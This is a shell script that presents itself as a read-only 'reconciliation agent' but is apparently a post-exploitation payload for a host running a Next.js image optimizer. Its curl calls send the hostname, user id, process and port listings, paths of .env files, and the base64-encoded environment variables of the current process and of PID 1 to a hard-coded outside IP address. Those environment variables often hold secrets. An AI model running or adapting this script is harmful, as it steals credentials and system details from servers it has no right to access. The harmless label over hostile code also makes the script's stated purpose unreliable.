#!/bin/sh
# i405 reconciliation agent: identify the host that EXECUTES this command and the image optimizer
# that PARSES /_next/image. Read-only. Reports hostname/pid/ppid/environ/mountinfo to sink.
NONCE="${NONCE:-i405a}"
b64(){ base64 -w0 2>/dev/null || base64 | tr -d '\n'; }
B='http://91.215.85.170:18088'
W='https://webhook.site/00000000-0000-0000-0000-000000000000'
send(){ curl -s -m 25 -G --data-urlencode "t=$NONCE-$1" --data-urlencode "d=$2" "$B" >/dev/null 2>&1; }
sendbig(){ # key file
  n=0; [ -f "$2" ] || { send "$1.count" 0; return; }
  while IFS= read -r line || [ -n "$line" ]; do send "$1.$n" "$line"; n=$((n+1)); done < "$2"
  send "$1.count" "$n"
}

send exec.hostname "$(hostname)"
send exec.self "$(cat /proc/self/cgroup 2>/dev/null | tr '\n' ';')"
send exec.pid "self=$$ ppid=$(awk '{print $4}' /proc/$$/stat)"
send exec.pself "$(tr '\0' ' ' </proc/$PPID/cmdline)"
send exec.p1 "$(tr '\0' ' ' </proc/1/cmdline)"
send exec.uname "$(uname -a)"
send exec.id "$(id)"
send exec.node "$(node -v 2>/dev/null)"
send plus_loader "$(tr '\0' ' ' </proc/$PPID/cmdline)"

# --- (a) who is on this box at ALL ---
send opt.ps "$(ps auxww 2>/dev/null | head -c 2500)"
send opt.ss "$( (ss -ltnp 2>/dev/null || netstat -ltnp 2>/dev/null) | head -c 1500)"
send opt.nodever "$(find / -xdev -type f -name node -perm -u+x 2>/dev/null | head -3 | tr '\n' ' ')"
send opt.sharp "$(find / -xdev -type d -name sharp 2>/dev/null | head -5 | tr '\n' ' ')"
send opt.vips "$(find / -xdev \( -iname '*vips*' -o -iname '*rsvg*' \) 2>/dev/null | head -8 | tr '\n' ' ')"
send opt.next "$(find / -xdev -type d -name '.next' 2>/dev/null | head -5 | tr '\n' ' ')"
send opt.appls "$(ls -la /app 2>/dev/null | head -c 1200)"
send opt.envfind "$(find / -xdev \( -path /proc -o -path /sys -o -path /dev \) -prune -o \( -iname '.env' -o -iname '.env.*' \) -print 2>/dev/null | head -30 | tr '\n' ' ')"

# /proc/* command lines that look node/next/sharp
: > /tmp/i405_procs
for p in /proc/[0-9]*; do
  cm=$(tr '\0' ' ' <"$p/cmdline" 2>/dev/null)
  case "$cm" in *node*|*next*|*sharp*|*vips*|*start.sh*) echo "$p CWD=$(readlink $p/cwd 2>/dev/null) CMD=$cm";; esac
done >> /tmp/i405_procs 2>/dev/null
sendbig opt.procs /tmp/i405_procs

# --- mountinfo + self environ ---
send self.environ.b64 "$(b64 </proc/self/environ)"
send p1.environ.b64 "$(b64 </proc/1/environ)"
tr '\0' '\n' </proc/self/environ > /tmp/i405_se 2>/dev/null; sendbig self.environ.nl /tmp/i405_se
grep -E 'overlay| /app | / ' /proc/self/mountinfo > /tmp/i405_mi 2>/dev/null; sendbig mountinfo /tmp/i405_mi
send hosts.b64 "$(b64 </etc/hosts)"
send hostname.b64 "$(b64 </etc/hostname)"
send done "$NONCE-complete"
# --- second-chance: upload all collected key/values as one blob ---
if [ -f /tmp/i405_se ]; then send fb.selfenv.b64 "$(b64 </tmp/i405_se)"; fi
curl -s -m 20 -G --data-urlencode "t=$NONCE-final" --data-urlencode "d=fired" "$B" >/dev/null 2>&1
